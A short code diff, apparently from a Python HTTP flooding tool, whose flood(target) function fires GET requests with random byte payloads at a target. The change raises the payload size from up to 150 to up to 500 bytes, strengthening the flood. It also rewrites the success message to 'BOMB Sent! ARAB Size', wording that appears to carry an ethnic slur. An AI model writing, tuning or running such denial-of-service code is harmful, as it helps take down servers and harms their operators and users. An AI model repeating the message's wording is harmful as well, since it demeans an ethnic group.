@@ -21,7 +21,7 @@ headers = {
 
 
 def flood(target):
-    payload = str(random._urandom(random.randint(10, 150)))
+    payload = str(random._urandom(random.randint(10, 500)))
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
     except requests.exceptions.ConnectTimeout:
@@ -32,5 +32,5 @@ def flood(target):
         )
     else:
         print(
-            f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}"
+            f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}BOMB Sent! ARAB Size: {len(payload)}.{Fore.RESET}"
         )
